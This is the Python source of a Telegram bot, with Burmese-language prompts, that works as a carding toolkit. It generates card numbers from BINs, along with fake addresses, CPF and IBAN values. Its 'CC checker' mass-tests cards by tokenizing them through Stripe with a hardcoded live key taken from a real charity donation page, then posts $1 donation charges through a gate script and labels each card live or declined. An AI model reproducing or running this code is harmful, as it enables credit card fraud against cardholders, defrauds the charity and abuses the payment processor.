import telebot
from telebot.types import BotCommand, ReplyKeyboardMarkup, KeyboardButton
import os
import random
import requests
import re
from flask import Flask
from threading import Thread

# --- Configuration ---
BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    print("Error: BOT_TOKEN မရှိပါ။")
    exit(1)

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Flask(__name__)

# --- Tracking All Users ---
ALL_USERS = set()
ALL_USERS_FILE = "all_users.txt"

def load_all_users():
    if os.path.exists(ALL_USERS_FILE):
        with open(ALL_USERS_FILE, "r") as f:
            for line in f:
                if line.strip().isdigit():
                    ALL_USERS.add(int(line.strip()))

def add_user(user_id):
    if user_id not in ALL_USERS:
        ALL_USERS.add(user_id)
        with open(ALL_USERS_FILE, "a") as f:
            f.write(f"{user_id}\n")

load_all_users()

# --- Admin Ban System (Blacklist) ---
ADMIN_ID = 1847021130
BANNED_USERS = set()
BAN_FILE = "banned.txt"

def load_banned():
    if os.path.exists(BAN_FILE):
        with open(BAN_FILE, "r") as f:
            for line in f:
                if line.strip().isdigit():
                    BANNED_USERS.add(int(line.strip()))

def save_banned():
    with open(BAN_FILE, "w") as f:
        for uid in BANNED_USERS:
            f.write(f"{uid}\n")

load_banned()

def is_banned(user_id):
    return user_id in BANNED_USERS

# --- Main Keyboard Menu ---
def get_main_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(KeyboardButton("🔐 Gen BIN"), KeyboardButton("💳 Check CC"))
    markup.add(KeyboardButton("👉 Fake Address"), KeyboardButton("ℹ️ IBAN Gen"))
    markup.add(KeyboardButton("©️ CPF Gen"), KeyboardButton("👤 My Info"))
    return markup

def setup_bot_commands():
    commands = [BotCommand("start", "🚀 Start Bot Menu")]
    try:
        bot.set_my_commands(commands)
    except Exception as e:
        print(f"Menu setup error: {e}")

# --- Dedicated /start Handler ---
@bot.message_handler(commands=['start'])
def cmd_start(message):
    add_user(message.from_user.id)
    if is_banned(message.from_user.id): return
    bot.reply_to(message, "🛠 <b>Bot Main Menu</b>\nအောက်ပါ ခလုတ်များကို နှိပ်၍ အသုံးပြုပါ။ Gen နှင့် Address သည် Format မှန်က တန်းပို့နိုင်သည်။", reply_markup=get_main_menu())

# --- Admin Commands ---
@bot.message_handler(commands=['ban'])
def cmd_ban(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        uid = int(message.text.split()[1])
        if uid == ADMIN_ID:
            bot.reply_to(message, "❌ Admin အကောင့်ကို Ban ၍မရပါ။")
            return
        BANNED_USERS.add(uid)
        save_banned()
        bot.reply_to(message, f"🚫 User ID <code>{uid}</code> ကို အသုံးပြုခွင့် ပိတ် (Ban) လိုက်ပါပြီ။")
    except:
        bot.reply_to(message, "❌ <b>အသုံးပြုနည်း:</b> <code>/ban user_id</code>")

@bot.message_handler(commands=['unban'])
def cmd_unban(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        uid = int(message.text.split()[1])
        BANNED_USERS.discard(uid)
        save_banned()
        bot.reply_to(message, f"✅ User ID <code>{uid}</code> ကို Ban မှ ပြန်ဖွင့်ပေးလိုက်ပါပြီ။")
    except:
        bot.reply_to(message, "❌ <b>အသုံးပြုနည်း:</b> <code>/unban user_id</code>")

@bot.message_handler(commands=['banned'])
def cmd_banned_list(message):
    if message.from_user.id != ADMIN_ID: return
    if not BANNED_USERS:
        bot.reply_to(message, "🟢 Banned လုပ်ထားသော User မရှိပါ။")
        return
    banned_str = "\n".join([f"<code>{u}</code>" for u in BANNED_USERS])
    bot.reply_to(message, f"🚫 <b>Banned Users:</b>\n\n{banned_str}")

@bot.message_handler(commands=['users'])
def cmd_users_list(message):
    if message.from_user.id != ADMIN_ID: return
    if not ALL_USERS:
        bot.reply_to(message, "🟢 အသုံးပြုသူ မရှိသေးပါ။")
        return
    users_list = list(ALL_USERS)
    total = len(users_list)
    display_users = users_list[-100:]
    users_str = "\n".join([f"<code>{u}</code>" for u in display_users])
    bot.reply_to(message, f"👥 <b>Total Bot Users:</b> <code>{total}</code>\n\n{users_str}")

# --- Direct Functions for Info & CPF ---
def cmd_me(message):
    user = message.from_user
    text = (
        f"🔍 <b>Telegram Account Info</b>\n\n"
        f"👤 Name: <code>{user.first_name} {user.last_name or ''}</code>\n"
        f"🆔 User ID: <code>{user.id}</code>\n"
        f"🌐 Username: <code>@{user.username or 'None'}</code>"
    )
    bot.reply_to(message, text, reply_markup=get_main_menu())

def cmd_cpf(message):
    first_names = ["Anderson", "Carlos", "Lucas", "Mariana", "Gabriel", "Beatriz", "Rafael", "Juliana", "Thiago", "Camila"]
    last_names = ["De Souza", "Silva", "Santos", "Oliveira", "Lima", "Ferreira", "Costa", "Pereira"]
    name = f"{random.choice(first_names)} {random.choice(last_names)}"
    cpf = f"{random.randint(100,999)}.{random.randint(100,999)}.{random.randint(100,999)}-{random.randint(10,99)}"
    text = (
        f"👉 <b>BR 🇧🇷 CPF Generator</b>\n\n"
        f"𝗡𝗮𝗺𝗲: <code>{name}</code>\n"
        f"𝗖𝗣𝗙: <code>{cpf}</code>\n"
        f"𝗗𝗼𝗕: <code>{random.randint(1970, 2005)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}</code>"
    )
    bot.reply_to(message, text, reply_markup=get_main_menu())

# --- CC Checker & Binlist Logic (With Detailed Response Debugging) ---
def check_bin(cc):
    bin_num = cc[:6]
    bin_data = {"banco": "Unknown", "pais": "Unknown", "nivel": "Unknown", "type": "Unknown"}
    try:
        r = requests.get(f"https://lookup.binlist.net/{bin_num}", headers={"Accept-Version": "3"}, timeout=5)
        if r.status_code == 200:
            data = r.json()
            bin_data['banco'] = data.get('bank', {}).get('name', 'Unknown')
            bin_data['pais'] = data.get('country', {}).get('name', 'Unknown')
            bin_data['nivel'] = data.get('brand', 'Unknown')
            type_cc = data.get('type', 'Unknown')
            bin_data['type'] = "Credit" if type_cc == "credit" else "Debit"
    except:
        pass
    return bin_data

def check_card(cc, mes, ano, cvv):
    bin_info = check_bin(cc)
    bin_text = f"{bin_info['type']}({bin_info['banco']}-{bin_info['nivel']})"
    
    token_url = 'https://api.stripe.com/v1/tokens'
    token_headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0'
    }
    token_payload = f"email=abhiyanqwe%40gmail.com&validation_type=card&payment_user_agent=Stripe+Checkout&referrer=https%3A%2F%2Fromero.mercycommunity.org.au%2Fdonate%2F&pasted_fields=number&card[number]={cc}&card[exp_month]={mes}&card[exp_year]={ano}&card[cvc]={cvv}&card[name]=Texa+LOl&card[address_line1]=4283+Express+Lane&card[address_city]=sarasota&card[address_state]=FL&card[address_zip]=34249&card[address_country]=United+States&time_on_page=62202&key=pk_live_ENpCAEI7OOkqeDauRnZvxTpX"

    try:
        req_token = requests.post(token_url, headers=token_headers, data=token_payload, timeout=10)
        token_res = req_token.text
        
        # Check if Token generation failed (e.g. Invalid Key)
        if "error" in token_res.lower():
            return f"⚠️ <b>Stripe Key Error / Dead Key:</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Raw:</b> <code>{token_res[:100]}</code>\n<b>By:</b> @Ren2512"

        token = ""
        if '"id": "' in token_res:
            token = token_res.split('"id": "')[1].split('"')[0]

        donate_url = 'https://mercy-stripe.xct01.com/donate.php'
        donate_headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'text/plain;charset=UTF-8'
        }
        donate_payload = '{"amount":"1","plan":null,"frequency":"one-off","currency":"aud","email":"texas1123@gmail.com","token":"' + token + '","description":"Romero Centre - $1 Gift"}'
        
        req_charge = requests.post(donate_url, headers=donate_headers, data=donate_payload, timeout=10)
        charge_res = req_charge.text

        # Success / Approved criteria
        if any(x in charge_res.lower() for x in ["success", "thank", "approved", "completed", "charge"]):
            return f"🟢 <b>#Approved (Live)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> @Ren2512"
        elif "Your card's security code is incorrect." in charge_res or "security code" in charge_res.lower():
            return f"🟢 <b>#Approved (CCN Live)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> @Ren2512"
        else:
            return f"🔴 <b>#Declined</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>Gate Res:</b> <code>{charge_res[:50]}</code>\n<b>By:</b> @Ren2512"

    except Exception as e:
        return f"⚠️ <b>Error Check:</b> {e}"

# --- Action Processors ---
def generate_cc(message, input_text):
    arg = input_text.strip()
    sub_parts = arg.split('|')
    template_cc = sub_parts[0].strip()
    custom_mm = sub_parts[1].strip() if len(sub_parts) > 1 and sub_parts[1].strip() else None
    custom_yyyy = sub_parts[2].strip() if len(sub_parts) > 2 and sub_parts[2].strip() else None
    custom_cvv = sub_parts[3].strip() if len(sub_parts) > 3 and sub_parts[3].strip() else None
    
    is_amex = template_cc.startswith("34") or template_cc.startswith("37")
    target_len = 15 if is_amex else 16
    card_length = max(target_len, len(template_cc) + 1)
    cvv_length = 4 if is_amex else 3
    
    cards = []
    for _ in range(10):
        rand_digits = "".join([str(random.randint(0, 9)) for _ in range(card_length - len(template_cc))])
        full_cc = template_cc + rand_digits
        mm = custom_mm.zfill(2) if custom_mm and custom_mm.lower() != 'xx' else f"{random.randint(1, 12):02d}"
        yyyy = ("20" + custom_yyyy if len(custom_yyyy) == 2 else custom_yyyy) if custom_yyyy and custom_yyyy.lower() not in ['xxxx', 'xx'] else str(random.randint(2027, 2035))
        cvv = custom_cvv if custom_cvv and custom_cvv.lower() != 'xxx' else "".join([str(random.randint(0, 9)) for _ in range(cvv_length)])
        cards.append(f"<code>{full_cc}|{mm}|{yyyy}|{cvv}</code>")
    
    bin6 = template_cc[:6]
    brand, bank, country, type_cc = "VISA", "COMMERCIAL BANK", "United States", "CREDIT"
    try:
        res = requests.get(f"https://lookup.binlist.net/{bin6}", headers={"Accept-Version": "3"}, timeout=3)
        if res.status_code == 200:
            data = res.json()
            brand = data.get('scheme', 'VISA').upper()
            bank = data.get('bank', {}).get('name', 'COMMERCIAL BANK')
            country = data.get('country', {}).get('name', 'United States')
            type_cc = data.get('type', 'CREDIT').upper()
    except:
        pass

    cards_str = "\n".join(cards)
    text = f"<b>𝗕𝗜𝗡 ⇾</b> <code>{template_cc}</code>\n<b>𝗔𝗺𝗼𝘂𝗻𝘁 ⇾</b> <code>10</code>\n\n{cards_str}\n\n<b>𝗜𝗻𝗳𝗼:</b> <code>{brand} - {type_cc}</code>\n<b>𝗕𝗮𝗻𝗸:</b> <code>{bank}</code>\n<b>𝗖𝗼𝘂𝗻𝘁𝗿𝘆:</b> <code>{country}</code>"
    bot.reply_to(message, text, reply_markup=get_main_menu())

def generate_fake_address(message, country_code):
    country_code = country_code.lower()
    if country_code == "gb": country_code = "uk"

    api_mapping = {"uk": "gb"}
    api_cc = api_mapping.get(country_code, country_code)
    api_supported_nats = ['au', 'br', 'ca', 'ch', 'de', 'dk', 'es', 'fi', 'fr', 'gb', 'ie', 'in', 'ir', 'mx', 'nl', 'no', 'nz', 'rs', 'tr', 'ua', 'us']
    
    if api_cc in api_supported_nats:
        try:
            req = requests.get(f"https://randomuser.me/api/?nat={api_cc}", timeout=5)
            if req.status_code == 200:
                data = req.json()['results'][0]
                text = (
                    f"👉 <b>{data['location']['country']} Address Generator</b>\n\n"
                    f"𝗙𝘂𝗹𝗹 𝗡𝗮𝗺𝗲: <code>{data['name']['first']} {data['name']['last']}</code>\n"
                    f"𝗦𝘁𝗿𝗲𝗲𝘁 𝗔𝗱𝗱𝗿𝗲𝘀𝘀: <code>{data['location']['street']['number']} {data['location']['street']['name']}</code>\n"
                    f"𝗖𝗶𝘁𝘆: <code>{data['location']['city']}</code>\n"
                    f"𝗣𝗵𝗼𝗻𝗲 𝗡𝘂𝗺𝗯𝗲𝗿: <code>{data['phone']}</code>"
                )
                bot.reply_to(message, text, reply_markup=get_main_menu())
                return
        except:
            pass

    loc_database = {
        "dz": {"country": "Algeria 🇩🇿", "first": ["Amine", "Fatima"], "last": ["Benali", "Khelifi"], "streets": ["Rue Didouche"], "cities": ["Algiers"], "phone": "+213 55123456"},
        "ar": {"country": "Argentina 🇦🇷", "first": ["Mateo", "Sofia"], "last": ["Gomez", "Fernandez"], "streets": ["Av. Corrientes"], "cities": ["Buenos Aires"], "phone": "+54 9 11 1234"},
        "au": {"country": "Australia 🇦🇺", "first": ["Jack", "Charlotte"], "last": ["Smith", "Wilson"], "streets": ["Collins St"], "cities": ["Sydney"], "phone": "+61 412 345 678"},
        "bh": {"country": "Bahrain 🇧🇭", "first": ["Ali", "Zainab"], "last": ["Hassan", "Ahmed"], "streets": ["Road No 2803"], "cities": ["Manama"], "phone": "+973 33123456"},
        "bd": {"country": "Bangladesh 🇧🇩", "first": ["Rahim", "Ayesha"], "last": ["Uddin", "Begum"], "streets": ["Gulshan Ave"], "cities": ["Dhaka"], "phone": "+880 17123456"},
        "be": {"country": "Belgium 🇧🇪", "first": ["Lucas", "Camille"], "last": ["Janssen", "Dubois"], "streets": ["Rue de la Loi"], "cities": ["Brussels"], "phone": "+32 470 123456"},
        "br": {"country": "Brazil 🇧🇷", "first": ["Anderson", "Mariana"], "last": ["Silva", "Santos"], "streets": ["Av. Paulista"], "cities": ["São Paulo"], "phone": "+55 11 91234"},
        "kh": {"country": "Cambodia 🇰🇭", "first": ["Sokha", "Vanna"], "last": ["Chan", "Seng"], "streets": ["Monivong Blvd"], "cities": ["Phnom Penh"], "phone": "+855 12 345 678"},
        "ca": {"country": "Canada 🇨🇦", "first": ["Liam", "Olivia"], "last": ["Tremblay", "Roy"], "streets": ["Yonge St"], "cities": ["Toronto"], "phone": "+1 416-555-0199"},
        "co": {"country": "Colombia 🇨🇴", "first": ["Santiago", "Valeria"], "last": ["Rodriguez", "Lopez"], "streets": ["Cra. 7"], "cities": ["Bogota"], "phone": "+57 310 1234567"},
        "dk": {"country": "Denmark 🇩🇰", "first": ["Magnus", "Ida"], "last": ["Nielsen", "Jensen"], "streets": ["Strøget"], "cities": ["Copenhagen"], "phone": "+45 20 12 34 56"},
        "eg": {"country": "Egypt 🇪🇬", "first": ["Ahmed", "Nour"], "last": ["Mohamed", "Ibrahim"], "streets": ["Tahrir Square"], "cities": ["Cairo"], "phone": "+20 10 1234 5678"},
        "fi": {"country": "Finland 🇫🇮", "first": ["Eetu", "Aino"], "last": ["Korhonen", "Virtanen"], "streets": ["Aleksanterinkatu"], "cities": ["Helsinki"], "phone": "+358 40 123 4567"},
        "fr": {"country": "France 🇫🇷", "first": ["Gabriel", "Jade"], "last": ["Bernard", "Petit"], "streets": ["Champs-Élysées"], "cities": ["Paris"], "phone": "+33 6 12 34 56 78"},
        "de": {"country": "Germany 🇩🇪", "first": ["Maximilian", "Anna"], "last": ["Schmidt", "Weber"], "streets": ["Hauptstraße"], "cities": ["Berlin"], "phone": "+49 151 1234567"},
        "id": {"country": "Indonesia 🇮🇩", "first": ["Budi", "Siti"], "last": ["Setiawan", "Lestari"], "streets": ["Jl. Sudirman"], "cities": ["Jakarta"], "phone": "+62 812 3456 7890"},
        "in": {"country": "India 🇮🇳", "first": ["Aarav", "Diya"], "last": ["Sharma", "Patel"], "streets": ["MG Road"], "cities": ["Mumbai"], "phone": "+91 98765 43210"},
        "it": {"country": "Italy 🇮🇹", "first": ["Leonardo", "Giulia"], "last": ["Rossi", "Russo"], "streets": ["Via Roma"], "cities": ["Rome"], "phone": "+39 320 123 4567"},
        "jp": {"country": "Japan 🇯🇵", "first": ["Haruto", "Yui"], "last": ["Sato", "Suzuki"], "streets": ["Nagata-cho"], "cities": ["Tokyo"], "phone": "+81 90-1234-5678"},
        "kz": {"country": "Kazakhstan 🇰🇿", "first": ["Timur", "Aigerim"], "last": ["Nurlan", "Omarov"], "streets": ["Dostyk Ave"], "cities": ["Astana"], "phone": "+7 701 123 4567"},
        "my": {"country": "Malaysia 🇲🇾", "first": ["Ahmad", "Siti"], "last": ["Tan", "Lee"], "streets": ["Jalan Ampang"], "cities": ["Kuala Lumpur"], "phone": "+60 12-345 6789"},
        "mx": {"country": "Mexico 🇲🇽", "first": ["Mateo", "Sofia"], "last": ["Garcia", "Martinez"], "streets": ["Paseo de la Reforma"], "cities": ["Mexico City"], "phone": "+52 55 1234 5678"},
        "ma": {"country": "Morocco 🇲🇦", "first": ["Youssef", "Kenza"], "last": ["Alami", "Bennani"], "streets": ["Mohammed V Blvd"], "cities": ["Casablanca"], "phone": "+212 612 345678"},
        "nz": {"country": "New Zealand 🇳🇿", "first": ["Oliver", "Isla"], "last": ["Clark", "Wright"], "streets": ["Queen Street"], "cities": ["Auckland"], "phone": "+64 21 123 4567"},
        "pa": {"country": "Panama 🇵🇦", "first": ["Carlos", "Maria"], "last": ["Perez", "Gonzalez"], "streets": ["Via España"], "cities": ["Panama City"], "phone": "+507 6123-4567"},
        "pk": {"country": "Pakistan 🇵🇰", "first": ["Hamza", "Ayesha"], "last": ["Khan", "Malik"], "streets": ["Jinnah Avenue"], "cities": ["Islamabad"], "phone": "+92 300 1234567"},
        "pe": {"country": "Peru 🇵🇪", "first": ["Diego", "Lucia"], "last": ["Flores", "Ramos"], "streets": ["Av. Larco"], "cities": ["Lima"], "phone": "+51 912 345 678"},
        "pl": {"country": "Poland 🇵🇱", "first": ["Jakub", "Julia"], "last": ["Nowak", "Kowalski"], "streets": ["Marszałkowska"], "cities": ["Warsaw"], "phone": "+48 500 123 456"},
        "qa": {"country": "Qatar 🇶🇦", "first": ["Fahad", "Noora"], "last": ["Al-Thani", "Al-Kuwari"], "streets": ["Corniche Street"], "cities": ["Doha"], "phone": "+974 5512 3456"},
        "sa": {"country": "Saudi Arabia 🇸🇦", "first": ["Salman", "Sara"], "last": ["Al-Saud", "Al-Otaibi"], "streets": ["King Fahd Road"], "cities": ["Riyadh"], "phone": "+966 50 123 4567"},
        "sg": {"country": "Singapore 🇸🇬", "first": ["Wei", "Li"], "last": ["Tan", "Lim"], "streets": ["Orchard Road"], "cities": ["Singapore"], "phone": "+65 9123 4567"},
        "es": {"country": "Spain 🇪🇸", "first": ["Hugo", "Lucia"], "last": ["Garcia", "Martinez"], "streets": ["Gran Via"], "cities": ["Madrid"], "phone": "+34 612 34 56 78"},
        "se": {"country": "Sweden 🇸🇪", "first": ["William", "Alice"], "last": ["Andersson", "Johansson"], "streets": ["Sveavägen"], "cities": ["Stockholm"], "phone": "+46 70 123 4567"},
        "ch": {"country": "Switzerland 🇨🇭", "first": ["Noah", "Mia"], "last": ["Muller", "Meier"], "streets": ["Bahnhofstrasse"], "cities": ["Zurich"], "phone": "+41 79 123 45 67"},
        "th": {"country": "Thailand 🇹🇭", "first": ["Somchai", "Suda"], "last": ["Saelim", "Wong"], "streets": ["Sukhumvit Road"], "cities": ["Bangkok"], "phone": "+66 81 234 5678"},
        "tr": {"country": "Turkiye 🇹🇷", "first": ["Yusuf", "Zeynep"], "last": ["Yilmaz", "Kaya"], "streets": ["Istiklal"], "cities": ["Istanbul"], "phone": "+90 512 345 6789"},
        "uk": {"country": "United Kingdom 🇬🇧", "first": ["George", "Olivia"], "last": ["Smith", "Jones"], "streets": ["High Street"], "cities": ["London"], "phone": "+44 7123 456789"},
        "us": {"country": "United States 🇺🇸", "first": ["James", "Mary"], "last": ["Smith", "Johnson"], "streets": ["Broadway"], "cities": ["New York"], "phone": "+1 (555) 123-4567"}
    }
    
    data = loc_database.get(country_code, loc_database["us"])
    text = (
        f"👉 <b>{data['country']} Address Generator</b>\n\n"
        f"𝗙𝘂𝗹𝗹 𝗡𝗮𝗺𝗲: <code>{random.choice(data['first'])} {random.choice(data['last'])}</code>\n"
        f"𝗦𝘁𝗿𝗲𝗲𝘁 𝗔𝗱𝗱𝗿𝗲𝘀𝘀: <code>{random.randint(1,9999)} {random.choice(data['streets'])}</code>\n"
        f"𝗖𝗶𝘁𝘆: <code>{random.choice(data['cities'])}</code>\n"
        f"𝗣𝗵𝗼𝗻𝗲 𝗡𝘂𝗺𝗯𝗲𝗿: <code>{data['phone']}</code>"
    )
    bot.reply_to(message, text, reply_markup=get_main_menu())

def show_country_list(message):
    sorted_countries = [
        ("Algeria", "dz"), ("Argentina", "ar"), ("Australia", "au"), ("Bahrain", "bh"),
        ("Bangladesh", "bd"), ("Belgium", "be"), ("Brazil", "br"), ("Cambodia", "kh"),
        ("Canada", "ca"), ("Colombia", "co"), ("Denmark", "dk"), ("Egypt", "eg"),
        ("Finland", "fi"), ("France", "fr"), ("Germany", "de"), ("India", "in"),
        ("Indonesia", "id"), ("Italy", "it"), ("Japan", "jp"), ("Kazakhstan", "kz"),
        ("Malaysia", "my"), ("Mexico", "mx"), ("Morocco", "ma"), ("New Zealand", "nz"),
        ("Panama", "pa"), ("Pakistan", "pk"), ("Peru", "pe"), ("Poland", "pl"),
        ("Qatar", "qa"), ("Saudi Arabia", "sa"), ("Singapore", "sg"), ("Spain", "es"),
        ("Sweden", "se"), ("Switzerland", "ch"), ("Thailand", "th"), ("Turkiye", "tr"),
        ("United Kingdom", "uk"), ("United States", "us")
    ]
    list_str = "📍 <b>Available Countries for Fake Address:</b>\n\n"
    for idx, (name, code) in enumerate(sorted_countries, 1):
        list_str += f"{idx}. {name} (<code>{code}</code>)\n"
    list_str += "\n💡 <i>နိုင်ငံကုဒ် (အသေးစာလုံး) ကို ဆက်လက် ပို့ပေးပါ (ဥပမာ - de, id, jp)</i>"
    bot.reply_to(message, list_str, reply_markup=get_main_menu())

def process_iban_prompt(message):
    if check_cancel(message): return
    country = message.text.strip().upper()
    flags = {"DE": "🇩🇪", "GB": "🇬🇧", "FR": "🇫🇷", "ES": "🇪🇸", "IT": "🇮🇹", "BR": "🇧🇷", "US": "🇺🇸", "CA": "🇨🇦", "ID": "🇮🇩"}
    flag = flags.get(country, "🌐")
    bank_code = "".join([str(random.randint(0, 9)) for _ in range(8)])
    acc_num = "".join([str(random.randint(0, 9)) for _ in range(10)])
    check_dig = f"{random.randint(10, 99)}"
    text = (
        f"🌍 <b>IBAN Details</b>\n\n"
        f"Country: <code>{country} {flag}</code>\n"
        f"IBAN: <code>{country}{check_dig}{bank_code}{acc_num}</code>"
    )
    bot.reply_to(message, text, reply_markup=get_main_menu())

# --- Routing for Text, Auto-Detect & Buttons ---
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    add_user(message.from_user.id) 
    if is_banned(message.from_user.id): return
    text = message.text.strip()

    if text in ["🔐 Gen BIN", "/gen"]:
        bot.reply_to(message, "⏳ <b>BIN Generator</b>\nBIN သို့မဟုတ် Format ကို တိုက်ရိုက် ပို့ပေးပါ။\n(ဥပမာ - <code>412236</code>)", reply_markup=get_main_menu())
        return
    elif text in ["💳 Check CC", "/chk"]:
        bot.reply_to(message, "⏳ <b>CC Checker</b>\nစစ်ဆေးလိုသော ကတ်များကို ပို့ပေးပါ။ (ကတ် ၁၀ ကတ်အထိ တစ်ပြိုင်နက် ပို့နိုင်ပါသည်)\n(ဥပမာ - <code>cc|mm|yyyy|cvv</code>)", reply_markup=get_main_menu())
        return
    elif text in ["👉 Fake Address", "/fake"]:
        bot.reply_to(message, "⏳ <b>Fake Address</b>\nနိုင်ငံကုဒ် ပို့ပေးပါ။ (ဥပမာ - <code>us</code>, <code>de</code>, <code>id</code>)\n\n💡 <i>နိုင်ငံစာရင်းကြည့်ရန် <code>list</code> ဟုရိုက်ပါ။</i>", reply_markup=get_main_menu())
        return
    elif text in ["ℹ️ IBAN Gen", "/iban"]:
        msg = bot.reply_to(message, "⏳ <b>IBAN Generator</b>\nနိုင်ငံကုဒ် ပို့ပေးပါ။ (ဥပမာ - <code>DE</code>, <code>GB</code>)", reply_markup=get_main_menu())
        bot.register_next_step_handler(msg, process_iban_prompt)
        return
    elif text in ["©️ CPF Gen", "/cpf"]:
        cmd_cpf(message)
        return
    elif text in ["👤 My Info", "/me"]:
        cmd_me(message)
        return
    elif text.upper() == "LIST":
        show_country_list(message)
        return

    # --- Mass Check CC Detection with Rate Limit Protection ---
    matches = re.findall(r'(\d{15,16})[\|/:;\s]+(\d{1,2})[\|/:;\s]+(\d{2,4})[\|/:;\s]+(\d{3,4})', text)
    if matches:
        if len(matches) > 15:
            matches = matches[:15]
            
        msg = bot.reply_to(message, f"⏳ <b>Checking {len(matches)} cards... Please wait.</b>")
        final_result = ""
        
        for idx, match in enumerate(matches):
            cc, mes, ano, cvv = match
            if len(ano) == 2:
                ano = "20" + ano
            res = check_card(cc, mes, ano, cvv)
            final_result += res + "\n\n"
            
            if (idx + 1) % 3 == 0 or (idx + 1) == len(matches):
                try:
                    bot.edit_message_text(final_result + f"⏳ <i>Checking {idx+1}/{len(matches)}...</i>", chat_id=message.chat.id, message_id=msg.message_id)
                except Exception:
                    pass
                    
        try:
            bot.edit_message_text(final_result + "✅ <b>Check Completed!</b>", chat_id=message.chat.id, message_id=msg.message_id)
        except Exception:
            pass
        return

    # Fake Address Country Code Detection
    all_country_codes = ["dz","ar","au","bh","bd","be","br","kh","ca","co","dk","eg","fi","fr","de","in","it","jp","kz","my","mx","ma","nz","pa","pk","pe","pl","qa","sa","sg","es","se","ch","th","tr","uk","us","gb","id"]
    if text.lower() in all_country_codes:
        generate_fake_address(message, text.lower())
        return

    # BIN Generator Detection
    if re.match(r'^\d{6}', text):
        generate_cc(message, text)
        return

# --- Flask Server & Polling for Render ---
@app.route('/')
def index():
    return "Bot is running on Render successfully!"

def run_server():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    Thread(target=run_server, daemon=True).start()
    setup_bot_commands()
    print("Telegram Bot Started on Render...")
    bot.infinity_polling()
